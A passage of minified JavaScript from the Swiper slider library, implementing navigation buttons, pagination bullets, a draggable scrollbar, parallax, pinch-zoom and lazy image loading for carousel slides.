e=this.$el;return"container"!==this.params.mousewheel.eventsTarget&&(e=g(this.params.mousewheel.eventsTarget)),e.off(t,this.mousewheel.handle),this.mousewheel.enabled=!1,!0}},Z={update:function(){var t=this.params.navigation;if(!this.params.loop){var e=this.navigation,i=e.$nextEl,n=e.$prevEl;n&&n.length>0&&(this.isBeginning?n.addClass(t.disabledClass):n.removeClass(t.disabledClass),n[this.params.watchOverflow&&this.isLocked?"addClass":"removeClass"](t.lockClass)),i&&i.length>0&&(this.isEnd?i.addClass(t.disabledClass):i.removeClass(t.disabledClass),i[this.params.watchOverflow&&this.isLocked?"addClass":"removeClass"](t.lockClass))}},onPrevClick:function(t){t.preventDefault(),this.isBeginning&&!this.params.loop||this.slidePrev()},onNextClick:function(t){t.preventDefault(),this.isEnd&&!this.params.loop||this.slideNext()},init:function(){var t,e,i=this.params.navigation;(i.nextEl||i.prevEl)&&(i.nextEl&&(t=g(i.nextEl),this.params.uniqueNavElements&&"string"==typeof i.nextEl&&t.length>1&&1===this.$el.find(i.nextEl).length&&(t=this.$el.find(i.nextEl))),i.prevEl&&(e=g(i.prevEl),this.params.uniqueNavElements&&"string"==typeof i.prevEl&&e.length>1&&1===this.$el.find(i.prevEl).length&&(e=this.$el.find(i.prevEl))),t&&t.length>0&&t.on("click",this.navigation.onNextClick),e&&e.length>0&&e.on("click",this.navigation.onPrevClick),T(this.navigation,{$nextEl:t,nextEl:t&&t[0],$prevEl:e,prevEl:e&&e[0]}))},destroy:function(){var t=this.navigation,e=t.$nextEl,i=t.$prevEl;e&&e.length&&(e.off("click",this.navigation.onNextClick),e.removeClass(this.params.navigation.disabledClass)),i&&i.length&&(i.off("click",this.navigation.onPrevClick),i.removeClass(this.params.navigation.disabledClass))}},J={update:function(){var t=this.rtl,e=this.params.pagination;if(e.el&&this.pagination.el&&this.pagination.$el&&0!==this.pagination.$el.length){var i,n=this.virtual&&this.params.virtual.enabled?this.virtual.slides.length:this.slides.length,r=this.pagination.$el,a=this.params.loop?Math.ceil((n-2*this.loopedSlides)/this.params.slidesPerGroup):this.snapGrid.length;if(this.params.loop?((i=Math.ceil((this.activeIndex-this.loopedSlides)/this.params.slidesPerGroup))>n-1-2*this.loopedSlides&&(i-=n-2*this.loopedSlides),i>a-1&&(i-=a),i<0&&"bullets"!==this.params.paginationType&&(i=a+i)):i=void 0!==this.snapIndex?this.snapIndex:this.activeIndex||0,"bullets"===e.type&&this.pagination.bullets&&this.pagination.bullets.length>0){var o,s,l,c=this.pagination.bullets;if(e.dynamicBullets&&(this.pagination.bulletSize=c.eq(0)[this.isHorizontal()?"outerWidth":"outerHeight"](!0),r.css(this.isHorizontal()?"width":"height",this.pagination.bulletSize*(e.dynamicMainBullets+4)+"px"),e.dynamicMainBullets>1&&void 0!==this.previousIndex&&(this.pagination.dynamicBulletIndex+=i-this.previousIndex,this.pagination.dynamicBulletIndex>e.dynamicMainBullets-1?this.pagination.dynamicBulletIndex=e.dynamicMainBullets-1:this.pagination.dynamicBulletIndex<0&&(this.pagination.dynamicBulletIndex=0)),o=i-this.pagination.dynamicBulletIndex,l=((s=o+(Math.min(c.length,e.dynamicMainBullets)-1))+o)/2),c.removeClass(e.bulletActiveClass+" "+e.bulletActiveClass+"-next "+e.bulletActiveClass+"-next-next "+e.bulletActiveClass+"-prev "+e.bulletActiveClass+"-prev-prev "+e.bulletActiveClass+"-main"),r.length>1)c.each((function(t){var n=g(t),r=n.index();r===i&&n.addClass(e.bulletActiveClass),e.dynamicBullets&&(r>=o&&r<=s&&n.addClass(e.bulletActiveClass+"-main"),r===o&&n.prev().addClass(e.bulletActiveClass+"-prev").prev().addClass(e.bulletActiveClass+"-prev-prev"),r===s&&n.next().addClass(e.bulletActiveClass+"-next").next().addClass(e.bulletActiveClass+"-next-next"))}));else{var h=c.eq(i),u=h.index();if(h.addClass(e.bulletActiveClass),e.dynamicBullets){for(var d=c.eq(o),p=c.eq(s),f=o;f<=s;f+=1)c.eq(f).addClass(e.bulletActiveClass+"-main");if(this.params.loop)if(u>=c.length-e.dynamicMainBullets){for(var m=e.dynamicMainBullets;m>=0;m-=1)c.eq(c.length-m).addClass(e.bulletActiveClass+"-main");c.eq(c.length-e.dynamicMainBullets-1).addClass(e.bulletActiveClass+"-prev")}else d.prev().addClass(e.bulletActiveClass+"-prev").prev().addClass(e.bulletActiveClass+"-prev-prev"),p.next().addClass(e.bulletActiveClass+"-next").next().addClass(e.bulletActiveClass+"-next-next");else d.prev().addClass(e.bulletActiveClass+"-prev").prev().addClass(e.bulletActiveClass+"-prev-prev"),p.next().addClass(e.bulletActiveClass+"-next").next().addClass(e.bulletActiveClass+"-next-next")}}if(e.dynamicBullets){var v=Math.min(c.length,e.dynamicMainBullets+4),y=(this.pagination.bulletSize*v-this.pagination.bulletSize)/2-l*this.pagination.bulletSize,x=t?"right":"left";c.css(this.isHorizontal()?x:"top",y+"px")}}if("fraction"===e.type&&(r.find("."+e.currentClass).text(e.formatFractionCurrent(i+1)),r.find("."+e.totalClass).text(e.formatFractionTotal(a))),"progressbar"===e.type){var b;b=e.progressbarOpposite?this.isHorizontal()?"vertical":"horizontal":this.isHorizontal()?"horizontal":"vertical";var w=(i+1)/a,_=1,M=1;"horizontal"===b?_=w:M=w,r.find("."+e.progressbarFillClass).transform("translate3d(0,0,0) scaleX("+_+") scaleY("+M+")").transition(this.params.speed)}"custom"===e.type&&e.renderCustom?(r.html(e.renderCustom(this,i+1,a)),this.emit("paginationRender",r[0])):this.emit("paginationUpdate",r[0]),r[this.params.watchOverflow&&this.isLocked?"addClass":"removeClass"](e.lockClass)}},render:function(){var t=this.params.pagination;if(t.el&&this.pagination.el&&this.pagination.$el&&0!==this.pagination.$el.length){var e=this.virtual&&this.params.virtual.enabled?this.virtual.slides.length:this.slides.length,i=this.pagination.$el,n="";if("bullets"===t.type){for(var r=this.params.loop?Math.ceil((e-2*this.loopedSlides)/this.params.slidesPerGroup):this.snapGrid.length,a=0;a<r;a+=1)t.renderBullet?n+=t.renderBullet.call(this,a,t.bulletClass):n+="<"+t.bulletElement+' class="'+t.bulletClass+'"></'+t.bulletElement+">";i.html(n),this.pagination.bullets=i.find("."+t.bulletClass)}"fraction"===t.type&&(n=t.renderFraction?t.renderFraction.call(this,t.currentClass,t.totalClass):'<span class="'+t.currentClass+'"></span> / <span class="'+t.totalClass+'"></span>',i.html(n)),"progressbar"===t.type&&(n=t.renderProgressbar?t.renderProgressbar.call(this,t.progressbarFillClass):'<span class="'+t.progressbarFillClass+'"></span>',i.html(n)),"custom"!==t.type&&this.emit("paginationRender",this.pagination.$el[0])}},init:function(){var t=this,e=t.params.pagination;if(e.el){var i=g(e.el);0!==i.length&&(t.params.uniqueNavElements&&"string"==typeof e.el&&i.length>1&&(i=t.$el.find(e.el)),"bullets"===e.type&&e.clickable&&i.addClass(e.clickableClass),i.addClass(e.modifierClass+e.type),"bullets"===e.type&&e.dynamicBullets&&(i.addClass(""+e.modifierClass+e.type+"-dynamic"),t.pagination.dynamicBulletIndex=0,e.dynamicMainBullets<1&&(e.dynamicMainBullets=1)),"progressbar"===e.type&&e.progressbarOpposite&&i.addClass(e.progressbarOppositeClass),e.clickable&&i.on("click","."+e.bulletClass,(function(e){e.preventDefault();var i=g(this).index()*t.params.slidesPerGroup;t.params.loop&&(i+=t.loopedSlides),t.slideTo(i)})),T(t.pagination,{$el:i,el:i[0]}))}},destroy:function(){var t=this.params.pagination;if(t.el&&this.pagination.el&&this.pagination.$el&&0!==this.pagination.$el.length){var e=this.pagination.$el;e.removeClass(t.hiddenClass),e.removeClass(t.modifierClass+t.type),this.pagination.bullets&&this.pagination.bullets.removeClass(t.bulletActiveClass),t.clickable&&e.off("click","."+t.bulletClass)}}},K={setTranslate:function(){if(this.params.scrollbar.el&&this.scrollbar.el){var t=this.scrollbar,e=this.rtlTranslate,i=this.progress,n=t.dragSize,r=t.trackSize,a=t.$dragEl,o=t.$el,s=this.params.scrollbar,l=n,c=(r-n)*i;e?(c=-c)>0?(l=n-c,c=0):-c+n>r&&(l=r+c):c<0?(l=n+c,c=0):c+n>r&&(l=r-c),this.isHorizontal()?(a.transform("translate3d("+c+"px, 0, 0)"),a[0].style.width=l+"px"):(a.transform("translate3d(0px, "+c+"px, 0)"),a[0].style.height=l+"px"),s.hide&&(clearTimeout(this.scrollbar.timeout),o[0].style.opacity=1,this.scrollbar.timeout=setTimeout((function(){o[0].style.opacity=0,o.transition(400)}),1e3))}},setTransition:function(t){this.params.scrollbar.el&&this.scrollbar.el&&this.scrollbar.$dragEl.transition(t)},updateSize:function(){if(this.params.scrollbar.el&&this.scrollbar.el){var t=this.scrollbar,e=t.$dragEl,i=t.$el;e[0].style.width="",e[0].style.height="";var n,r=this.isHorizontal()?i[0].offsetWidth:i[0].offsetHeight,a=this.size/this.virtualSize,o=a*(r/this.size);n="auto"===this.params.scrollbar.dragSize?r*a:parseInt(this.params.scrollbar.dragSize,10),this.isHorizontal()?e[0].style.width=n+"px":e[0].style.height=n+"px",i[0].style.display=a>=1?"none":"",this.params.scrollbar.hide&&(i[0].style.opacity=0),T(t,{trackSize:r,divider:a,moveDivider:o,dragSize:n}),t.$el[this.params.watchOverflow&&this.isLocked?"addClass":"removeClass"](this.params.scrollbar.lockClass)}},getPointerPosition:function(t){return this.isHorizontal()?"touchstart"===t.type||"touchmove"===t.type?t.targetTouches[0].clientX:t.clientX:"touchstart"===t.type||"touchmove"===t.type?t.targetTouches[0].clientY:t.clientY},setDragPosition:function(t){var e,i=this.scrollbar,n=this.rtlTranslate,r=i.$el,a=i.dragSize,o=i.trackSize,s=i.dragStartPos;e=(i.getPointerPosition(t)-r.offset()[this.isHorizontal()?"left":"top"]-(null!==s?s:a/2))/(o-a),e=Math.max(Math.min(e,1),0),n&&(e=1-e);var l=this.minTranslate()+(this.maxTranslate()-this.minTranslate())*e;this.updateProgress(l),this.setTranslate(l),this.updateActiveIndex(),this.updateSlidesClasses()},onDragStart:function(t){var e=this.params.scrollbar,i=this.scrollbar,n=this.$wrapperEl,r=i.$el,a=i.$dragEl;this.scrollbar.isTouched=!0,this.scrollbar.dragStartPos=t.target===a[0]||t.target===a?i.getPointerPosition(t)-t.target.getBoundingClientRect()[this.isHorizontal()?"left":"top"]:null,t.preventDefault(),t.stopPropagation(),n.transition(100),a.transition(100),i.setDragPosition(t),clearTimeout(this.scrollbar.dragTimeout),r.transition(0),e.hide&&r.css("opacity",1),this.params.cssMode&&this.$wrapperEl.css("scroll-snap-type","none"),this.emit("scrollbarDragStart",t)},onDragMove:function(t){var e=this.scrollbar,i=this.$wrapperEl,n=e.$el,r=e.$dragEl;this.scrollbar.isTouched&&(t.preventDefault?t.preventDefault():t.returnValue=!1,e.setDragPosition(t),i.transition(0),n.transition(0),r.transition(0),this.emit("scrollbarDragMove",t))},onDragEnd:function(t){var e=this.params.scrollbar,i=this.scrollbar,n=this.$wrapperEl,r=i.$el;this.scrollbar.isTouched&&(this.scrollbar.isTouched=!1,this.params.cssMode&&(this.$wrapperEl.css("scroll-snap-type",""),n.transition("")),e.hide&&(clearTimeout(this.scrollbar.dragTimeout),this.scrollbar.dragTimeout=w((function(){r.css("opacity",0),r.transition(400)}),1e3)),this.emit("scrollbarDragEnd",t),e.snapOnRelease&&this.slideToClosest())},enableDraggable:function(){if(this.params.scrollbar.el){var t=a(),e=this.scrollbar,i=this.touchEventsTouch,n=this.touchEventsDesktop,r=this.params,o=this.support,s=e.$el[0],l=!(!o.passiveListener||!r.passiveListeners)&&{passive:!1,capture:!1},c=!(!o.passiveListener||!r.passiveListeners)&&{passive:!0,capture:!1};o.touch?(s.addEventListener(i.start,this.scrollbar.onDragStart,l),s.addEventListener(i.move,this.scrollbar.onDragMove,l),s.addEventListener(i.end,this.scrollbar.onDragEnd,c)):(s.addEventListener(n.start,this.scrollbar.onDragStart,l),t.addEventListener(n.move,this.scrollbar.onDragMove,l),t.addEventListener(n.end,this.scrollbar.onDragEnd,c))}},disableDraggable:function(){if(this.params.scrollbar.el){var t=a(),e=this.scrollbar,i=this.touchEventsTouch,n=this.touchEventsDesktop,r=this.params,o=this.support,s=e.$el[0],l=!(!o.passiveListener||!r.passiveListeners)&&{passive:!1,capture:!1},c=!(!o.passiveListener||!r.passiveListeners)&&{passive:!0,capture:!1};o.touch?(s.removeEventListener(i.start,this.scrollbar.onDragStart,l),s.removeEventListener(i.move,this.scrollbar.onDragMove,l),s.removeEventListener(i.end,this.scrollbar.onDragEnd,c)):(s.removeEventListener(n.start,this.scrollbar.onDragStart,l),t.removeEventListener(n.move,this.scrollbar.onDragMove,l),t.removeEventListener(n.end,this.scrollbar.onDragEnd,c))}},init:function(){if(this.params.scrollbar.el){var t=this.scrollbar,e=this.$el,i=this.params.scrollbar,n=g(i.el);this.params.uniqueNavElements&&"string"==typeof i.el&&n.length>1&&1===e.find(i.el).length&&(n=e.find(i.el));var r=n.find("."+this.params.scrollbar.dragClass);0===r.length&&(r=g('<div class="'+this.params.scrollbar.dragClass+'"></div>'),n.append(r)),T(t,{$el:n,el:n[0],$dragEl:r,dragEl:r[0]}),i.draggable&&t.enableDraggable()}},destroy:function(){this.scrollbar.disableDraggable()}},Q={setTransform:function(t,e){var i=this.rtl,n=g(t),r=i?-1:1,a=n.attr("data-swiper-parallax")||"0",o=n.attr("data-swiper-parallax-x"),s=n.attr("data-swiper-parallax-y"),l=n.attr("data-swiper-parallax-scale"),c=n.attr("data-swiper-parallax-opacity");if(o||s?(o=o||"0",s=s||"0"):this.isHorizontal()?(o=a,s="0"):(s=a,o="0"),o=o.indexOf("%")>=0?parseInt(o,10)*e*r+"%":o*e*r+"px",s=s.indexOf("%")>=0?parseInt(s,10)*e+"%":s*e+"px",null!=c){var h=c-(c-1)*(1-Math.abs(e));n[0].style.opacity=h}if(null==l)n.transform("translate3d("+o+", "+s+", 0px)");else{var u=l-(l-1)*(1-Math.abs(e));n.transform("translate3d("+o+", "+s+", 0px) scale("+u+")")}},setTranslate:function(){var t=this,e=t.$el,i=t.slides,n=t.progress,r=t.snapGrid;e.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((function(e){t.parallax.setTransform(e,n)})),i.each((function(e,i){var a=e.progress;t.params.slidesPerGroup>1&&"auto"!==t.params.slidesPerView&&(a+=Math.ceil(i/2)-n*(r.length-1)),a=Math.min(Math.max(a,-1),1),g(e).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((function(e){t.parallax.setTransform(e,a)}))}))},setTransition:function(t){void 0===t&&(t=this.params.speed),this.$el.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((function(e){var i=g(e),n=parseInt(i.attr("data-swiper-parallax-duration"),10)||t;0===t&&(n=0),i.transition(n)}))}},tt={getDistanceBetweenTouches:function(t){if(t.targetTouches.length<2)return 1;var e=t.targetTouches[0].pageX,i=t.targetTouches[0].pageY,n=t.targetTouches[1].pageX,r=t.targetTouches[1].pageY;return Math.sqrt(Math.pow(n-e,2)+Math.pow(r-i,2))},onGestureStart:function(t){var e=this.support,i=this.params.zoom,n=this.zoom,r=n.gesture;if(n.fakeGestureTouched=!1,n.fakeGestureMoved=!1,!e.gestures){if("touchstart"!==t.type||"touchstart"===t.type&&t.targetTouches.length<2)return;n.fakeGestureTouched=!0,r.scaleStart=tt.getDistanceBetweenTouches(t)}r.$slideEl&&r.$slideEl.length||(r.$slideEl=g(t.target).closest("."+this.params.slideClass),0===r.$slideEl.length&&(r.$slideEl=this.slides.eq(this.activeIndex)),r.$imageEl=r.$slideEl.find("img, svg, canvas, picture, .swiper-zoom-target"),r.$imageWrapEl=r.$imageEl.parent("."+i.containerClass),r.maxRatio=r.$imageWrapEl.attr("data-swiper-zoom")||i.maxRatio,0!==r.$imageWrapEl.length)?(r.$imageEl&&r.$imageEl.transition(0),this.zoom.isScaling=!0):r.$imageEl=void 0},onGestureChange:function(t){var e=this.support,i=this.params.zoom,n=this.zoom,r=n.gesture;if(!e.gestures){if("touchmove"!==t.type||"touchmove"===t.type&&t.targetTouches.length<2)return;n.fakeGestureMoved=!0,r.scaleMove=tt.getDistanceBetweenTouches(t)}r.$imageEl&&0!==r.$imageEl.length?(e.gestures?n.scale=t.scale*n.currentScale:n.scale=r.scaleMove/r.scaleStart*n.currentScale,n.scale>r.maxRatio&&(n.scale=r.maxRatio-1+Math.pow(n.scale-r.maxRatio+1,.5)),n.scale<i.minRatio&&(n.scale=i.minRatio+1-Math.pow(i.minRatio-n.scale+1,.5)),r.$imageEl.transform("translate3d(0,0,0) scale("+n.scale+")")):"gesturechange"===t.type&&n.onGestureStart(t)},onGestureEnd:function(t){var e=this.device,i=this.support,n=this.params.zoom,r=this.zoom,a=r.gesture;if(!i.gestures){if(!r.fakeGestureTouched||!r.fakeGestureMoved)return;if("touchend"!==t.type||"touchend"===t.type&&t.changedTouches.length<2&&!e.android)return;r.fakeGestureTouched=!1,r.fakeGestureMoved=!1}a.$imageEl&&0!==a.$imageEl.length&&(r.scale=Math.max(Math.min(r.scale,a.maxRatio),n.minRatio),a.$imageEl.transition(this.params.speed).transform("translate3d(0,0,0) scale("+r.scale+")"),r.currentScale=r.scale,r.isScaling=!1,1===r.scale&&(a.$slideEl=void 0))},onTouchStart:function(t){var e=this.device,i=this.zoom,n=i.gesture,r=i.image;n.$imageEl&&0!==n.$imageEl.length&&(r.isTouched||(e.android&&t.cancelable&&t.preventDefault(),r.isTouched=!0,r.touchesStart.x="touchstart"===t.type?t.targetTouches[0].pageX:t.pageX,r.touchesStart.y="touchstart"===t.type?t.targetTouches[0].pageY:t.pageY))},onTouchMove:function(t){var e=this.zoom,i=e.gesture,n=e.image,r=e.velocity;if(i.$imageEl&&0!==i.$imageEl.length&&(this.allowClick=!1,n.isTouched&&i.$slideEl)){n.isMoved||(n.width=i.$imageEl[0].offsetWidth,n.height=i.$imageEl[0].offsetHeight,n.startX=M(i.$imageWrapEl[0],"x")||0,n.startY=M(i.$imageWrapEl[0],"y")||0,i.slideWidth=i.$slideEl[0].offsetWidth,i.slideHeight=i.$slideEl[0].offsetHeight,i.$imageWrapEl.transition(0),this.rtl&&(n.startX=-n.startX,n.startY=-n.startY));var a=n.width*e.scale,o=n.height*e.scale;if(!(a<i.slideWidth&&o<i.slideHeight)){if(n.minX=Math.min(i.slideWidth/2-a/2,0),n.maxX=-n.minX,n.minY=Math.min(i.slideHeight/2-o/2,0),n.maxY=-n.minY,n.touchesCurrent.x="touchmove"===t.type?t.targetTouches[0].pageX:t.pageX,n.touchesCurrent.y="touchmove"===t.type?t.targetTouches[0].pageY:t.pageY,!n.isMoved&&!e.isScaling){if(this.isHorizontal()&&(Math.floor(n.minX)===Math.floor(n.startX)&&n.touchesCurrent.x<n.touchesStart.x||Math.floor(n.maxX)===Math.floor(n.startX)&&n.touchesCurrent.x>n.touchesStart.x))return void(n.isTouched=!1);if(!this.isHorizontal()&&(Math.floor(n.minY)===Math.floor(n.startY)&&n.touchesCurrent.y<n.touchesStart.y||Math.floor(n.maxY)===Math.floor(n.startY)&&n.touchesCurrent.y>n.touchesStart.y))return void(n.isTouched=!1)}t.cancelable&&t.preventDefault(),t.stopPropagation(),n.isMoved=!0,n.currentX=n.touchesCurrent.x-n.touchesStart.x+n.startX,n.currentY=n.touchesCurrent.y-n.touchesStart.y+n.startY,n.currentX<n.minX&&(n.currentX=n.minX+1-Math.pow(n.minX-n.currentX+1,.8)),n.currentX>n.maxX&&(n.currentX=n.maxX-1+Math.pow(n.currentX-n.maxX+1,.8)),n.currentY<n.minY&&(n.currentY=n.minY+1-Math.pow(n.minY-n.currentY+1,.8)),n.currentY>n.maxY&&(n.currentY=n.maxY-1+Math.pow(n.currentY-n.maxY+1,.8)),r.prevPositionX||(r.prevPositionX=n.touchesCurrent.x),r.prevPositionY||(r.prevPositionY=n.touchesCurrent.y),r.prevTime||(r.prevTime=Date.now()),r.x=(n.touchesCurrent.x-r.prevPositionX)/(Date.now()-r.prevTime)/2,r.y=(n.touchesCurrent.y-r.prevPositionY)/(Date.now()-r.prevTime)/2,Math.abs(n.touchesCurrent.x-r.prevPositionX)<2&&(r.x=0),Math.abs(n.touchesCurrent.y-r.prevPositionY)<2&&(r.y=0),r.prevPositionX=n.touchesCurrent.x,r.prevPositionY=n.touchesCurrent.y,r.prevTime=Date.now(),i.$imageWrapEl.transform("translate3d("+n.currentX+"px, "+n.currentY+"px,0)")}}},onTouchEnd:function(){var t=this.zoom,e=t.gesture,i=t.image,n=t.velocity;if(e.$imageEl&&0!==e.$imageEl.length){if(!i.isTouched||!i.isMoved)return i.isTouched=!1,void(i.isMoved=!1);i.isTouched=!1,i.isMoved=!1;var r=300,a=300,o=n.x*r,s=i.currentX+o,l=n.y*a,c=i.currentY+l;0!==n.x&&(r=Math.abs((s-i.currentX)/n.x)),0!==n.y&&(a=Math.abs((c-i.currentY)/n.y));var h=Math.max(r,a);i.currentX=s,i.currentY=c;var u=i.width*t.scale,d=i.height*t.scale;i.minX=Math.min(e.slideWidth/2-u/2,0),i.maxX=-i.minX,i.minY=Math.min(e.slideHeight/2-d/2,0),i.maxY=-i.minY,i.currentX=Math.max(Math.min(i.currentX,i.maxX),i.minX),i.currentY=Math.max(Math.min(i.currentY,i.maxY),i.minY),e.$imageWrapEl.transition(h).transform("translate3d("+i.currentX+"px, "+i.currentY+"px,0)")}},onTransitionEnd:function(){var t=this.zoom,e=t.gesture;e.$slideEl&&this.previousIndex!==this.activeIndex&&(e.$imageEl&&e.$imageEl.transform("translate3d(0,0,0) scale(1)"),e.$imageWrapEl&&e.$imageWrapEl.transform("translate3d(0,0,0)"),t.scale=1,t.currentScale=1,e.$slideEl=void 0,e.$imageEl=void 0,e.$imageWrapEl=void 0)},toggle:function(t){var e=this.zoom;e.scale&&1!==e.scale?e.out():e.in(t)},in:function(t){var e,i,n,r,a,o,s,l,c,h,u,d,p,f,m,g,v=this.zoom,y=this.params.zoom,x=v.gesture,b=v.image;x.$slideEl||(this.params.virtual&&this.params.virtual.enabled&&this.virtual?x.$slideEl=this.$wrapperEl.children("."+this.params.slideActiveClass):x.$slideEl=this.slides.eq(this.activeIndex),x.$imageEl=x.$slideEl.find("img, svg, canvas, picture, .swiper-zoom-target"),x.$imageWrapEl=x.$imageEl.parent("."+y.containerClass)),x.$imageEl&&0!==x.$imageEl.length&&(x.$slideEl.addClass(""+y.zoomedSlideClass),void 0===b.touchesStart.x&&t?(e="touchend"===t.type?t.changedTouches[0].pageX:t.pageX,i="touchend"===t.type?t.changedTouches[0].pageY:t.pageY):(e=b.touchesStart.x,i=b.touchesStart.y),v.scale=x.$imageWrapEl.attr("data-swiper-zoom")||y.maxRatio,v.currentScale=x.$imageWrapEl.attr("data-swiper-zoom")||y.maxRatio,t?(m=x.$slideEl[0].offsetWidth,g=x.$slideEl[0].offsetHeight,n=x.$slideEl.offset().left+m/2-e,r=x.$slideEl.offset().top+g/2-i,s=x.$imageEl[0].offsetWidth,l=x.$imageEl[0].offsetHeight,c=s*v.scale,h=l*v.scale,p=-(u=Math.min(m/2-c/2,0)),f=-(d=Math.min(g/2-h/2,0)),(a=n*v.scale)<u&&(a=u),a>p&&(a=p),(o=r*v.scale)<d&&(o=d),o>f&&(o=f)):(a=0,o=0),x.$imageWrapEl.transition(300).transform("translate3d("+a+"px, "+o+"px,0)"),x.$imageEl.transition(300).transform("translate3d(0,0,0) scale("+v.scale+")"))},out:function(){var t=this.zoom,e=this.params.zoom,i=t.gesture;i.$slideEl||(this.params.virtual&&this.params.virtual.enabled&&this.virtual?i.$slideEl=this.$wrapperEl.children("."+this.params.slideActiveClass):i.$slideEl=this.slides.eq(this.activeIndex),i.$imageEl=i.$slideEl.find("img, svg, canvas, picture, .swiper-zoom-target"),i.$imageWrapEl=i.$imageEl.parent("."+e.containerClass)),i.$imageEl&&0!==i.$imageEl.length&&(t.scale=1,t.currentScale=1,i.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"),i.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"),i.$slideEl.removeClass(""+e.zoomedSlideClass),i.$slideEl=void 0)},toggleGestures:function(t){var e=this.zoom,i=e.slideSelector,n=e.passiveListener;this.$wrapperEl[t]("gesturestart",i,e.onGestureStart,n),this.$wrapperEl[t]("gesturechange",i,e.onGestureChange,n),this.$wrapperEl[t]("gestureend",i,e.onGestureEnd,n)},enableGestures:function(){this.zoom.gesturesEnabled||(this.zoom.gesturesEnabled=!0,this.zoom.toggleGestures("on"))},disableGestures:function(){this.zoom.gesturesEnabled&&(this.zoom.gesturesEnabled=!1,this.zoom.toggleGestures("off"))},enable:function(){var t=this.support,e=this.zoom;if(!e.enabled){e.enabled=!0;var i=!("touchstart"!==this.touchEvents.start||!t.passiveListener||!this.params.passiveListeners)&&{passive:!0,capture:!1},n=!t.passiveListener||{passive:!1,capture:!0},r="."+this.params.slideClass;this.zoom.passiveListener=i,this.zoom.slideSelector=r,t.gestures?(this.$wrapperEl.on(this.touchEvents.start,this.zoom.enableGestures,i),this.$wrapperEl.on(this.touchEvents.end,this.zoom.disableGestures,i)):"touchstart"===this.touchEvents.start&&(this.$wrapperEl.on(this.touchEvents.start,r,e.onGestureStart,i),this.$wrapperEl.on(this.touchEvents.move,r,e.onGestureChange,n),this.$wrapperEl.on(this.touchEvents.end,r,e.onGestureEnd,i),this.touchEvents.cancel&&this.$wrapperEl.on(this.touchEvents.cancel,r,e.onGestureEnd,i)),this.$wrapperEl.on(this.touchEvents.move,"."+this.params.zoom.containerClass,e.onTouchMove,n)}},disable:function(){var t=this.zoom;if(t.enabled){var e=this.support;this.zoom.enabled=!1;var i=!("touchstart"!==this.touchEvents.start||!e.passiveListener||!this.params.passiveListeners)&&{passive:!0,capture:!1},n=!e.passiveListener||{passive:!1,capture:!0},r="."+this.params.slideClass;e.gestures?(this.$wrapperEl.off(this.touchEvents.start,this.zoom.enableGestures,i),this.$wrapperEl.off(this.touchEvents.end,this.zoom.disableGestures,i)):"touchstart"===this.touchEvents.start&&(this.$wrapperEl.off(this.touchEvents.start,r,t.onGestureStart,i),this.$wrapperEl.off(this.touchEvents.move,r,t.onGestureChange,n),this.$wrapperEl.off(this.touchEvents.end,r,t.onGestureEnd,i),this.touchEvents.cancel&&this.$wrapperEl.off(this.touchEvents.cancel,r,t.onGestureEnd,i)),this.$wrapperEl.off(this.touchEvents.move,"."+this.params.zoom.containerClass,t.onTouchMove,n)}}},et={loadInSlide:function(t,e){void 0===e&&(e=!0);var i=this,n=i.params.lazy;if(void 0!==t&&0!==i.slides.length){var r=i.virtual&&i.params.virtual.enabled?i.$wrapperEl.children("."+i.params.slideClass+'[data-swiper-slide-index="'+t+'"]'):i.slides.eq(t),a=r.find("."+n.elementClass+":not(."+n.loadedClass+"):not(."+n.loadingClass+")");!r.hasClass(n.elementClass)||r.hasClass(n.loadedClass)||r.hasClass(n.loadingClass)||a.push(r[0]),0!==a.length&&a.each((function(t){var a=g(t);a.addClass(n.loadingClass);var o=a.attr("data-background"),s=a.attr("data-src"),l=a.attr("data-srcset"),c=a.attr("data-sizes"),h=a.parent("picture");i.loadImage(a[0],s||o,l,c,!1,(function(){if(null!=i&&i&&(!i||i.params)&&!i.destroyed){if(o?(a.css("background-image",'url("'+o+'")'),a.removeAttr("data-background")):(l&&(a.attr("srcset",l),a.removeAttr("data-srcset")),c&&(a.attr("sizes",c),a.removeAttr("data-sizes")),h.length&&h.children("source").each((function(t){var e=g(t);e.attr("data-srcset")&&(e.attr("srcset",e.attr("data-srcset")),e.removeAttr("data-srcset"))})),s&&(a.attr("src",s),a.removeAttr("data-src"))),a.addClass(n.loadedClass).removeClass(n.loadingClass),r.find("."+n.preloaderClass).remove(),i.params.loop&&e){var t=r.attr("data-swiper-slide-index");if(r.hasClass(i.params.slideDuplicateClass)){var u=i.$wrapperEl.children('[data-swiper-slide-index="'+t+'"]:not(.'+i.params.slideDuplicateClass+")");i.lazy.loadInSlide(u.index(),!1)}else{var d=i.$wrapperEl.children("."+i.params.slideDuplicateClass+'[data-swiper-slide-index="'+t+'"]');i.lazy.loadInSlide(d.index(),!1)}}i.emit("lazyImageReady",r[0],a[0]),i.params.autoHeight&&i.updateAutoHeight()}})),i.emit("lazyImageLoad",r[0],a[0])}))}},load:function(){var t=this,e=t.$wrapperEl,i=t.params,n=t.slides,r=t.activeIndex,a=t.virtual&&i.virtual.enabled,o=i.lazy,s=i.slidesPerView;function l(t){if(a){if(e.children("."+i.slideClass+'[data-swiper-slide-index="'+t+'"]').length)return!0}else if(n[t])return!0;return!1}function c(t){return a?g(t).attr("data-swiper-slide-index"):g(t).index()}if("auto"===s&&(s=0),t.lazy.initialImageLoaded||(t.lazy.initialImageLoaded=!0),t.params.watchSlidesVisibility)e.children("."+i.slideVisibleClass).each((function(e){var i=a?g(e).attr("data-swiper-slide-index"):g(e).index();t.lazy.loadInSlide(i)}));else if(s>1)for(var h=r;h<r+s;h+=1)l(h)&&t.lazy.loadInSlide(h);else t.lazy.loadInSlide(r);if(o.loadPrevNext)if(s>1||o.loadPrevNextAmount&&o.loadPrevNextAmount>1){for(var u=o.loadPrevNextAmount,d=s,p=Math.min(r+d+Math.max(u,d),n.length),f=Math.max(r-Math.max(d,u),0),m=r+s;m<p;m+=1)l(m)&&t.lazy.loadInSlide(m);for(var v=f;v<r;v+=1)l(v)&&t.lazy.loadInSlide(v)}else{var y=e.children("."+i.slideNextClass);y.length>0&&t.lazy.loadInSlide(c(y));var 